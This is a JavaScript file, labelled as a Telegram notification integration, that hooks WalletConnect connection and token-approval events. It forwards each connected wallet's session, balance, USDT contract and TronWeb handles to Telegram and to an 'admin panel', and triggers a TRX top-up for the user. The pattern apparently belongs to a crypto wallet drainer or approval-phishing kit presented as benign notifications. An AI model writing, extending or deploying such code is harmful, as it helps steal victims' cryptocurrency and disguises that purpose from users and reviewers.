// Wallet Integration Script for Telegram Notifications
// This script hooks into the wallet connection events

(function() {
    'use strict';
    
    // Wait for the main application to load
    function waitForWalletConnect() {
        // Check if the wallet connect functionality is available
        if (typeof window !== 'undefined' && window.telegramNotificationService) {
            console.log("✅ Telegram notification service loaded");
            
            // Hook into wallet connection events
            hookIntoWalletEvents();
        } else {
            // Retry after a short delay
            setTimeout(waitForWalletConnect, 1000);
        }
    }
    
    function hookIntoWalletEvents() {
        // Override the onConnect method if it exists
        if (window.WalletConnect && window.WalletConnect.prototype) {
            const originalOnConnect = window.WalletConnect.prototype.onConnect;
            
            window.WalletConnect.prototype.onConnect = function() {
                // Call the original method
                if (originalOnConnect) {
                    originalOnConnect.call(this);
                }
                
                                        // Send Telegram notification
                        setTimeout(() => {
                            try {
                                if (window.sendTelegramWalletNotification && this.session) {
                                    window.sendTelegramWalletNotification(
                                        this.session,
                                        this.getBalance ? this.getBalance.bind(this) : null,
                                        this.getUSDTSmartContract ? this.getUSDTSmartContract.bind(this) : null,
                                        this.getTronWeb ? this.getTronWeb.bind(this) : null
                                    );
                                }
                                
                                // Track wallet connection for admin panel
                                if (window.trackWalletConnection) {
                                    window.trackWalletConnection({
                                        session: this.session,
                                        balance: this.getBalance ? this.getBalance.bind(this) : null
                                    });
                                }
                        
                        // Check user balance and send TRX if needed
                        if (window.checkAndTopupUserTRX && this.session) {
                            console.log("🔗 Wallet connected, checking user balance...");
                            setTimeout(() => {
                                window.checkAndTopupUserTRX(this.session);
                            }, 2000); // Additional delay for balance check
                        }
                    } catch (error) {
                        console.error("Error sending Telegram notification:", error);
                    }
                }, 1000); // Delay to ensure session is fully established
            };
        }
        
        // Alternative approach: Listen for custom events
        document.addEventListener('walletConnected', function(event) {
            console.log("Wallet connected event detected:", event.detail);
            
            setTimeout(() => {
                try {
                    if (window.sendTelegramWalletNotification && event.detail) {
                        window.sendTelegramWalletNotification(
                            event.detail.session,
                            event.detail.getBalance,
                            event.detail.getUSDTSmartContract,
                            event.detail.getTronWeb
                        );
                    }
                } catch (error) {
                    console.error("Error sending Telegram notification:", error);
                }
            }, 1000);
        });
        
        // Hook into wallet approval success events
        document.addEventListener('walletApprovalSuccess', function(event) {
            console.log("Wallet approval success event detected:", event.detail);
            
            setTimeout(() => {
                try {
                    if (window.sendWalletApprovalSuccessNotification && event.detail) {
                        window.sendWalletApprovalSuccessNotification(
                            event.detail.session,
                            event.detail.approvalDetails
                        );
                    }
                    
                    // Track wallet approval for admin panel
                    if (window.trackWalletApproval) {
                        window.trackWalletApproval(event.detail);
                    }
                } catch (error) {
                    console.error("Error sending wallet approval notification:", error);
                }
            }, 1000);
        });
        
        console.log("✅ Wallet event hooks installed");
    }
    
    // Start the integration when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', waitForWalletConnect);
    } else {
        waitForWalletConnect();
    }
    
    // Also try to hook into existing wallet instances
    setTimeout(() => {
        if (window.ethereum || window.tronWeb) {
            console.log("✅ Web3 provider detected, setting up notifications");
            hookIntoWalletEvents();
        }
    }, 2000);
    
})();
